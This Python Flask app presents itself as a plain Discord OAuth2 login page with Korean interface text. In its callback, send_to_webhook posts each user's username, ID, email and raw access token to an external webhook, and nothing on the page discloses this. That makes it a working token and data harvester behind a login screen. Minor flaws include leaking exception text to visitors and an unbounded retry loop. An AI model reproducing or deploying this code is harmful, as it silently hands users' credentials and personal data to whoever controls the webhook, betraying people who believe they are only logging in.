import os
import requests
import time
import traceback
from flask import Flask, request, redirect

# ============================================================
# Render 환경변수 (자동으로 읽음)
# ============================================================
CLIENT_ID = os.getenv("CLIENT_ID")
CLIENT_SECRET = os.getenv("CLIENT_SECRET")
REDIRECT_URI = os.getenv("REDIRECT_URI")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")
# ============================================================

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Discord OAuth2</title>
        <style>
            body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0d1117; color: #c9d1d9; }
            .container { text-align: center; background: #161b22; padding: 50px; border-radius: 16px; border: 1px solid #30363d; }
            h1 { color: #58a6ff; }
            .btn { background: #5865f2; color: white; padding: 14px 40px; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; }
            .btn:hover { background: #4752c4; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔑 Discord OAuth2</h1>
            <a href="/login" class="btn">🚀 디스코드로 로그인</a>
        </div>
    </body>
    </html>
    '''

@app.route('/login')
def login():
    # Discord OAuth2 URL 생성
    discord_auth_url = (
        f"https://discord.com/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify+email"
    )
    return redirect(discord_auth_url)

@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    if not code:
        return "❌ 인증 코드가 없습니다.", 400

    print(f"📩 받은 코드: {code[:20]}...")

    try:
        # 🔥 1. 코드를 토큰으로 교환 (직접 구현)
        token_data = exchange_code_for_token(code)
        if not token_data:
            return "❌ 토큰 교환에 실패했습니다.", 500

        # 🔥 2. 사용자 정보 가져오기
        user_info = get_user_info(token_data['access_token'])
        if not user_info:
            return "❌ 사용자 정보를 가져오지 못했습니다.", 500

        # 🔥 3. 웹훅으로 전송
        send_to_webhook(token_data, user_info)

        return f"✅ 로그인 성공! {user_info.get('username')} 님, 환영합니다! 🎉"

    except Exception as e:
        error_msg = str(e)
        print(f"❌ 오류 발생: {error_msg}")
        print(traceback.format_exc())
        return f"❌ 서버 오류가 발생했습니다: {error_msg}", 500

def exchange_code_for_token(code):
    """코드를 액세스 토큰으로 교환"""
    # Rate Limit 방지를 위한 대기 (필수!)
    time.sleep(2)

    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    response = requests.post('https://discord.com/api/v10/oauth2/token', data=data, headers=headers)

    print(f"📨 토큰 교환 응답 코드: {response.status_code}")

    if response.status_code == 200:
        return response.json()
    else:
        # Rate Limit 처리
        if response.status_code == 429:
            retry_after = int(response.headers.get('Retry-After', 5))
            print(f"⏳ Rate Limit: {retry_after}초 후 재시도")
            time.sleep(retry_after)
            return exchange_code_for_token(code)  # 재귀 호출로 재시도
        return None

def get_user_info(access_token):
    """액세스 토큰으로 사용자 정보 가져오기"""
    headers = {'Authorization': f'Bearer {access_token}'}
    response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)

    if response.status_code == 200:
        return response.json()
    return None

def send_to_webhook(token_data, user_info):
    if not WEBHOOK_URL:
        return

    webhook_data = {
        "content": f"🔑 **{user_info.get('username')}** 님이 로그인했습니다!",
        "embeds": [{
            "title": "👤 사용자 정보",
            "color": 0x5865F2,
            "fields": [
                {"name": "📛 사용자명", "value": user_info.get('username', 'N/A'), "inline": True},
                {"name": "🆔 ID", "value": f"`{user_info.get('id', 'N/A')}`", "inline": True},
                {"name": "📧 이메일", "value": user_info.get('email', '비공개'), "inline": True},
                {"name": "🔑 Access Token", "value": f"```{token_data.get('access_token', 'N/A')}```", "inline": False}
            ]
        }]
    }
    requests.post(WEBHOOK_URL, json=webhook_data)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
